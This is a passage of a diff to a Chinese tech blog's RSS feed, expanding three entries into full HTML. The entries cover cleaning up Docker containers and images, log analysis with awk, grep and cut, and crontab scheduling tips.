-批量删除已经退出的容器 docker ps -a | grep &amp;#34;Exited&amp;#34; | awk &amp;#39;{print $1 }&amp;#39; | xargs docker rm 批量删除带有 none 字段的镜像 $3 一般就是取出每一行的镜像 id 字段
-# 方案1： 根据镜像id删除镜像 docker images| grep none |awk &amp;#39;{print $3 }&amp;#39;|xargs docker rmi # 方案2: 根据镜像名删除镜像 docker images | grep wecloud | awk &amp;#39;{print $1&amp;#34;:&amp;#34;$2}&amp;#39; | xargs docker rmi 方案 1，根据镜像 ID 删除镜像时，有写镜像虽然镜像名不同，但是镜像 ID 都是相同的，这是后往往会删除失败。所以根据镜像名删除镜像的效果会更好。
-删除镜像定时任务脚本 #!/bin/bash # create by wangduanduan # when current free disk less then max free disk, you can remove docker images # GREEN=&amp;#39;\033[0;32m&amp;#39; RED=&amp;#39;\033[0;31m&amp;#39; NC=&amp;#39;\033[0m&amp;#39; max_free_disk=5 # 5G.</description>
+      <description>&lt;p&gt;使用 jenkins 作为打包的工具，主机上的磁盘空间总是被慢慢被占满，直到 jenkins 无法运行。本文从几个方面来清理 docker 垃圾。&lt;/p&gt;
+&lt;h1 id=&#34;批量删除已经退出的容器&#34;&gt;批量删除已经退出的容器&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;docker ps -a | grep &amp;#34;Exited&amp;#34; | awk &amp;#39;{print $1 }&amp;#39; | xargs docker rm
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;批量删除带有-none-字段的镜像&#34;&gt;批量删除带有 none 字段的镜像&lt;/h1&gt;
+&lt;p&gt;$3 一般就是取出每一行的镜像 id 字段&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 方案1： 根据镜像id删除镜像
+docker images| grep none |awk &amp;#39;{print $3 }&amp;#39;|xargs docker rmi
+# 方案2: 根据镜像名删除镜像
+docker images | grep wecloud | awk &amp;#39;{print $1&amp;#34;:&amp;#34;$2}&amp;#39; | xargs docker rmi
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;方案 1，根据镜像 ID 删除镜像时，有写镜像虽然镜像名不同，但是镜像 ID 都是相同的，这是后往往会删除失败。所以根据镜像名删除镜像的效果会更好。&lt;/p&gt;
+&lt;h1 id=&#34;删除镜像定时任务脚本&#34;&gt;删除镜像定时任务脚本&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# create by wangduanduan&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# when current free disk less then max free disk, you can remove docker images&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GREEN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\033[0;32m&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RED&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\033[0;31m&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\033[0m&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;max_free_disk&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 5G. when current free disk less then max free disk, remove docker images&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;current_free_disk&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;df -lh | grep centos-root | awk &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{print strtonum($4)}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;df -lh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;max_free_disk: &lt;/span&gt;$max_free_disk&lt;span style=&#34;color:#e6db74&#34;&gt; G&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;current_free_disk: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;GREEN&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;$current_free_disk&lt;span style=&#34;color:#e6db74&#34;&gt; G &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;NC&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $current_free_disk -lt $max_free_disk &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;RED&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; need to clean up docker images &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;NC&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	docker images | grep none | awk &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{print $3 }&amp;#39;&lt;/span&gt; | xargs docker rmi
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	docker images | grep wecloud | awk &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{print $1&amp;#34;:&amp;#34;$2}&amp;#39;&lt;/span&gt; | xargs docker rmi
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;GREEN&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;no need clean&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;NC&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;注意事项&#34;&gt;注意事项&lt;/h1&gt;
+&lt;p&gt;&lt;code&gt;为了加快打包的速度，一般不要太频繁的删除镜像&lt;/code&gt;。因为老的镜像中的某些不改变的层，可以作为新的镜像的缓存，从而大大加快构建的速度。&lt;/p&gt;</description>
     </item>
-    
     <item>
       <title>awk、grep、cut、sort、uniq简单命令玩转日志分析与统计</title>
       <link>https://wdd.js.org/shell/log-ana/</link>
       <pubDate>Tue, 06 Aug 2019 11:24:53 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/log-ana/</guid>
-      <description>test.log
-2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.1 cause:&amp;#34;BBB&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn 2019-1010-1920 192.345.23.1 cause:&amp;#34;BBJ&amp;#34; type:&amp;#34;A&amp;#34; loginIn 按列分割 提取第三列日志列数比较少或则要提取的字段比较靠前时，优先使用 awk。当然 cut 也可以做到。比如输出日志的第三列
-awk &amp;#39;{print $3}&amp;#39; test.log // $3表示第三列 cut -d &amp;#34; &amp;#34; -f3 test.log // -f3指定第三列, -d用来指定分割符 正则提取 提取 cause 字段的原因值？
-2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; loginIn cause:&amp;#34;BBB&amp;#34; 2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn 2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; cause:&amp;#34;BBJ&amp;#34; loginIn 当要提取的内容不在同一列时，往往就无法用cut或者awk就按列提取。最好用的方式是用 grep 的正则提取。好像 grep 不支持捕获分组，所以只能提取出出 cause:&amp;ldquo;AAA&amp;rdquo;，而无法直接提取出 AAA</description>
+      <description>&lt;p&gt;test.log&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn
+2019-1010-1920 192.345.23.1 cause:&amp;#34;BBB&amp;#34; type:&amp;#34;A&amp;#34; loginIn
+2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn
+2019-1010-1920 192.345.23.1 cause:&amp;#34;BBJ&amp;#34; type:&amp;#34;A&amp;#34; loginIn
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;按列分割&#34;&gt;按列分割&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;提取第三列&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;日志列数比较少或则要提取的字段比较靠前时，优先使用 awk。当然 cut 也可以做到。&lt;!-- raw HTML omitted --&gt;比如输出日志的第三列&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;awk &amp;#39;{print $3}&amp;#39; test.log // $3表示第三列
+cut -d &amp;#34; &amp;#34; -f3 test.log // -f3指定第三列, -d用来指定分割符
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;正则提取&#34;&gt;正则提取&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;提取 cause 字段的原因值？&lt;/strong&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn
+2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; loginIn cause:&amp;#34;BBB&amp;#34;
+2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn
+2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; cause:&amp;#34;BBJ&amp;#34; loginIn
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;当要提取的内容不在同一列时，往往就无法用cut或者awk就按列提取&lt;/code&gt;。最好用的方式是用 grep 的正则提取。&lt;!-- raw HTML omitted --&gt;好像 grep 不支持捕获分组，所以只能提取出出 cause:&amp;ldquo;AAA&amp;rdquo;，而无法直接提取出 AAA&lt;/p&gt;</description>
     </item>
-    
     <item>
       <title>长太息以掩涕兮，哀crontab之难用</title>
       <link>https://wdd.js.org/shell/crontab-tips/</link>
       <pubDate>Mon, 01 Jul 2019 18:59:57 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/crontab-tips/</guid>
-      <description>我已经在 crontab 上栽了很多次跟头了，我决定写个总结。
-常用的命令 crontab -l # 显示计划任务脚本 crontab -e # 编辑计划任务 计划任务的格式 时间格式 * # 每个最小单元 / # 时间步长，每隔多长时间执行 */10 - # 区间，如 4-9 , # 散列，如 4,9,10 几个例子 crontab 最小支持的时间单位是 1 分钟，不支持每个多少秒执行一次
-# 每分钟执行 * * * * * cmd # 每小时的15，45分钟执行 15,45 * * * * cmd # 每个周一到周五，早上9点到下午6点之间，每隔15分钟喝一次水 */15 9,18 * * 1-5 喝水 每个 X 秒执行 crontab 的默认最小执行周期是 1 分钟，如果想每隔多少秒执行一次，就需要一些特殊的手段。
-每隔 5 秒 * * * * * for i in {1.</description>
+      <description>&lt;p&gt;我已经在 crontab 上栽了很多次跟头了，我决定写个总结。&lt;/p&gt;
+&lt;h1 id=&#34;常用的命令&#34;&gt;常用的命令&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;crontab -l &lt;span style=&#34;color:#75715e&#34;&gt;# 显示计划任务脚本&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;crontab -e &lt;span style=&#34;color:#75715e&#34;&gt;# 编辑计划任务&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;计划任务的格式&#34;&gt;计划任务的格式&lt;/h1&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/shell/crontab-tips/2022-10-29-14-37-43.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;时间格式&#34;&gt;时间格式&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* &lt;span style=&#34;color:#75715e&#34;&gt;# 每个最小单元&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/ &lt;span style=&#34;color:#75715e&#34;&gt;# 时间步长，每隔多长时间执行 */10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- &lt;span style=&#34;color:#75715e&#34;&gt;# 区间，如 4-9&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;# 散列，如 4,9,10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;几个例子&#34;&gt;几个例子&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;crontab 最小支持的时间单位是 1 分钟，不支持每个多少秒执行一次&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 每分钟执行&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* * * * * cmd
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 每小时的15，45分钟执行&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;15,45 * * * * cmd
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 每个周一到周五，早上9点到下午6点之间，每隔15分钟喝一次水&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;*/15 9,18 * * 1-5 喝水
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;每个-x-秒执行&#34;&gt;每个 X 秒执行&lt;/h1&gt;
+&lt;p&gt;crontab 的默认最小执行周期是 1 分钟，如果想每隔多少秒执行一次，就需要一些特殊的手段。&lt;/p&gt;
+&lt;h2 id=&#34;每隔-5-秒&#34;&gt;每隔 5 秒&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* * * * * &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i in &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;1..12&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; /bin/cmd -arg1 ; sleep 5; &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;heading&#34;&gt;&lt;/h2&gt;
+&lt;h2 id=&#34;每隔-15-秒&#34;&gt;每隔 15 秒&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* * * * * /bin/cmd -arg1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* * * * * sleep 15; /bin/cmd -arg1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* * * * * sleep 30; /bin/cmd -arg1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* * * * * sleep 45; /bin/cmd -arg1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;heading-1&#34;&gt;&lt;/h1&gt;
+&lt;h1 id=&#34;为什么-crontab-指定的脚本没有执行&#34;&gt;为什么 crontab 指定的脚本没有执行？&lt;/h1&gt;
+&lt;p&gt;有以下可能原因&lt;/p&gt;</description>
     </item>
-    
   </channel>
 </rss>
